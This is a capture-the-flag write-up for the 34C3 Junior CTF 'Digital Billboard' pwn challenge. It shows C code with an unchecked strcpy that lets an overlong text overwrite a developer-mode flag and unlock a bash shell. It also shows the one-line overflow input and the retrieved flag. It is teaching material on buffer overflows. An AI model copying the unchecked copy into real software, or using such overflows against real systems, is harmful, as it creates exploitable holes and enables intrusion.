Digital-Billboard -easy
========
**Category**: pwn  **Points**: 41

Challenge Description
------
```
We bought a new Digital Billboard for CTF advertisement:
```
We were given the following codes
```C
#ifndef _MYLIB_H_
#define _MYLIB_H_

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "module.h"

const char* name = "Digital Billboard";
const char* info =  "We bought a new digital billboard for CTF advertisement.\n"
                    "\n"
                    "Type \"help\" for help :)";


struct billboard {
    char text[256];
    char devmode;
};
struct billboard bb = { .text="Placeholder", .devmode=0 };

void set_text(int argc, char* argv[]) {
    strcpy(bb.text, argv[1]);
    printf("Successfully set text to: %s\n", bb.text);
    return;
}

void shell(int argc, char* argv[]) {
    if (bb.devmode) {
        printf("Developer access to billboard granted.\n");
        system("/bin/bash");
    } else {
        printf("Developer mode disabled!\n");
    }
    return;
}

void help(int argc, char* argv[]) {
    printf("This is helpful.\n");
    return;
}


void initialize_module(module_t* module, registration_function register_command) {
    
    module->name = name;
    module->info = info;

    register_command("set_text", "<text>\t\t", "Set the text displayed on the board", set_text);
    register_command("devmode", "\t\t", "Developer mode", shell);

   
    strcpy(bb.text, "Welcome to 34C3 JUNIOR CTF");
}

#endif
```

Solution
---------
Okay I didn't quite understand the C codes, it's just that this few lines interest me

```C
struct billboard {
    char text[256];
    char devmode;
};

```

This obviously indicates a buffer overflow attack.

```
set_text AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

We can now enter devmode, finding a flag.txt sitting right at the directory

```
cat flag.txt
34C3_w3lc0me_t0_34c3_ctf_H4ve_fuN
```

Flag: 34C3_w3lc0me_t0_34c3_ctf_H4ve_fuN
